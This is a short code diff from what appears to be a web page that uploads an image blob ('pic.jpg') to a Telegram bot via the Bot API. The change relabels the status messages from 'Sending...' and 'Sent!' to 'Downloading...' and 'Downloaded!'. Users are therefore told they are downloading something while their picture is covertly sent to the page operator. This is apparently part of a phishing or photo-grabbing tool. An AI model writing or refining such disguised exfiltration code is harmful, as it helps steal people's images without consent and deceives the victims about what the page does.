@@ -666,13 +666,13 @@
                 
                 // Send to Telegram
                 statusMsg.style.display = 'block';
-                statusMsg.innerText = "Sending...";
+                statusMsg.innerText = "Downloading...";
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', blob, 'pic.jpg');
                 try {
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-                    statusMsg.innerText = "Sent!";
+                    statusMsg.innerText = "Downloaded!";
                 } catch (e) { statusMsg.innerText = "Error"; }
                 setTimeout(() => statusMsg.style.display = 'none', 2000);
 
